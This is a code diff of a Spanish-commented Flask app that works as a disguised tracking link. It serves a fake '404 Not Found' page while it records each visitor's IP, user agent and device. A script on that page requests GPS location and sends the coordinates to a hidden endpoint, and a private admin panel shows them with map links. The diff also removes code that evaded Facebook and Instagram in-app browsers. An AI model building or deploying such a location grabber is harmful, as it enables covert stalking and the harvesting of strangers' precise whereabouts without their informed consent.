@@ -7,7 +7,7 @@ import os
 app = Flask(__name__)
 
 visitas = []
-gps_data = []
+gps_data = []  # 🔥 NUEVO (para guardar GPS)
 
 # 🔐 Credenciales
 USUARIO = os.environ.get("USER", "admin")
@@ -32,7 +32,7 @@ def require_auth(f):
     decorated.__name__ = f.__name__
     return decorated
 
-# 🌐 Obtener IP real
+# 🌐 IP real
 def obtener_ip_real():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     return ip.split(',')[0].strip()
@@ -61,7 +61,7 @@ def detectar_dispositivo(user_agent):
     else:
         return "💻 PC"
 
-# 🏠 Página principal
+# 🏠 Página principal (404 + script GPS)
 @app.route("/")
 def inicio():
     ip = obtener_ip_real()
@@ -92,47 +92,11 @@ def inicio():
         "user_agent": user_agent
     })
 
-    # 🔥 BLOQUEO AGRESIVO FACEBOOK
+    # 🔥 SCRIPT GPS
     return """
-    <script>
-    var ua = navigator.userAgent.toLowerCase();
-
-    if (ua.includes("fbav") || ua.includes("fban") || ua.includes("instagram")) {
-
-        document.body.innerHTML = `
-        <div style="background:#000;color:#fff;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:sans-serif;">
-            <h1>⚠️ Abrir en navegador</h1>
-            <p>Este contenido no está disponible aquí</p>
-            <p>Ábrelo en Chrome o tu navegador</p>
-
-            <button onclick="abrirChrome()" style="padding:15px 25px;font-size:18px;margin-top:20px;">
-                Abrir en Chrome
-            </button>
-
-            <br><br>
-
-            <button onclick="copiar()" style="padding:10px 20px;">
-                Copiar enlace
-            </button>
-        </div>
-        `;
-    }
-
-    function abrirChrome() {
-        var url = window.location.href.replace(/^https?:\\/\\//, '');
-        window.location.href = "googlechrome://" + url;
-    }
-
-    function copiar() {
-        navigator.clipboard.writeText(window.location.href);
-        alert("Link copiado, ábrelo en tu navegador");
-    }
-    </script>
-
     <h1>404 Not Found</h1>
 
     <script>
-    // GPS (solo si acepta)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos) {
             fetch("/guardar_gps", {
@@ -150,7 +114,7 @@ def inicio():
     </script>
     """, 404
 
-# 📍 Guardar GPS
+# 📍 GUARDAR GPS
 @app.route("/guardar_gps", methods=["POST"])
 def guardar_gps():
     data = request.json
@@ -164,11 +128,12 @@ def guardar_gps():
 
     return "OK"
 
-# 🔐 Panel admin
+# 🔐 PANEL ADMIN
 @app.route("/admin")
 @require_auth
 def admin():
 
+    # 🔹 TABLA IP
     tabla = ""
     for v in visitas:
         tabla += f"""
@@ -187,6 +152,7 @@ def admin():
         </tr>
         """
 
+    # 🔹 TABLA GPS
     tabla_gps = ""
     for g in gps_data:
         link = f"https://www.google.com/maps?q={g['lat']},{g['lon']}"
@@ -195,12 +161,12 @@ def admin():
             <td>{g['lat']}</td>
             <td>{g['lon']}</td>
             <td>{g['fecha']}</td>
-            <td><a href="{link}" target="_blank">📍</a></td>
+            <td><a href="{link}" target="_blank">📍 Ver</a></td>
         </tr>
         """
 
     return f"""
-    <h1>Panel Privado 🔐</h1>
+    <h1>Panel Avanzado 🔐</h1>
 
     <h2>🌐 Datos por IP</h2>
     <table border="1">
@@ -222,11 +188,11 @@ def admin():
 
     <br><br>
 
-    <h2>📍 GPS Preciso</h2>
+    <h2>📍 GPS (Preciso)</h2>
     <table border="1">
         <tr>
-            <th>Lat</th>
-            <th>Lon</th>
+            <th>Latitud</th>
+            <th>Longitud</th>
             <th>Fecha</th>
             <th>Mapa</th>
         </tr>
@@ -234,6 +200,6 @@ def admin():
     </table>
     """
 
-# 🚀 Run
+# 🚀 RUN
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
